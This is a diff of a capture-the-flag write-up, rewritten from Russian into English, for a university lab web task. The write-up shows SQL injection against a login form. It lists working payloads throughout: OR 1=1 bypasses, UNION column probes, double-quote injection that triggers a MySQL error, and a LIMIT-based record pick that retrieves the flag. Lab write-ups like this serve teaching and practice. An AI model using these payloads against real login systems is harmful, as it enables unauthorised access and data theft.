@@ -1,48 +1,73 @@
-## Club - http://club.tasks.prak.seclab.cs.msu.ru/
+![club](images/club.png)
+> Club - http://club.tasks.prak.seclab.cs.msu.ru/
 
-1) Видим форму на 2 параметра: `Email` + `Password`, что сразу сподвигает на
-мысль об SQL иньекции
+### Hm...
+- A form with two parameters: `Email` + `Password` → immediately suggests SQL injection.
 
-сначала пробую:  
-`"username=test&pass=test&email=' OR '1'='1"`  
-`"username=test&pass=test&email='--"`  
-`"username=test&pass=test" -H "Cookie: session=1' OR '1'='1"`
+**First attempts** (none worked at the login level):
+```
+username=test&pass=test&email=' OR '1'='1
+username=test&pass=test&email='--
+username=test&pass=test -H "Cookie: session=1' OR '1'='1"
+```
 
---- ничего не работает на уровне внедрения
+**Then tried in the username field:**
+```
+' OR 1=1 --
+' OR 1=1 /*
+' OR 1=1; --
+' OR 1=1 #
+```
+– still nothing.
 
-попробовал что то простое - в поле юзернейм ввожу что то типа:
-`' OR 1=1 --`  
-`' OR 1=1 /*`  
-`' OR 1=1; --`  
-`' OR 1=1 #`
+**Union attempts** – always `login failed`, even though I expected an error with column count:
+```
+' UNION SELECT null --
+' UNION SELECT null,null --
+' UNION SELECT null,null,null --
+```
 
-- опять не то
+> [!NOTE]
+> `login failed` every time – is that normal?
 
-но кстати юнионы везде выдают логин фэйлед, хотя я думал что при каком то из них скажет скольк колонок  
-`' UNION SELECT null --`  
-`' UNION SELECT null,null --`  
-`' UNION SELECT null,null,null --`  
-что то при любых запросах `login failed`, это норм?
+**Then I replaced `'` with `"` (!)** and got an error:
+```
+ERROR ====> DB error 1064: ... near '''' at line 1.
+```
+→ Confirmed SQL injection.
 
-и тут я попробовал еще `'` заменить на `"` (!)
+---
 
-`ERROR ====> DB error 1064: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server
-version for the right syntax to use near '''' at line 1. O`
+### Digging into the table
 
-#тут будет вставка про то как я шерстил таблицу
+```
+" OR EXISTS(SELECT 1 FROM pages WHERE degree='Grand Master') #
+```
+→ After this, the test `Grand Master` user logged in successfully.
 
-`" OR EXISTS(SELECT 1 FROM pages WHERE degree='Grand Master') #` у меня почему то после такого заходит на грика этого тестового)
-  
-`" AND 1=0 UNION SELECT 'Grand Master' #`  
-` " OR "1"="1" UNION SELECT 'Grand Master' #`
+```
+" AND 1=0 UNION SELECT 'Grand Master' #
+" OR "1"="1" UNION SELECT 'Grand Master' #
+```
+→ Those gave `Internal Error`.
 
-а такое типо `Internal Error`
+**Knowing the existing records, I simply wrote:**
+```
+" OR degree = 'Grand Master' #
+```
+→ **Flag found!** 🎉
+
+---
+
+### Another way (alphabetical order)
+I noticed that records are stored in **alphabetical order**.  
+By clicking through I found the `G` entry, or:
+
+```
+" OR 1=1 LIMIT 647,1 #
+```
+→ Also works.
 
 
-И в итоге после того как я знал какие есть записи в табице я просто написал `" OR degree = 'Grand Master' # `- и нашел флаг
 
-также еще посмотрев аккуратно таблицы я понял что записи в них хранятся в
-алфавитном порядке, в следствие чего я смог просто протыкав найти G
-
-`“ or 1=1 limit 647,1 #` - тоже решение
-
+🎉 **Flag received on the webhook!**
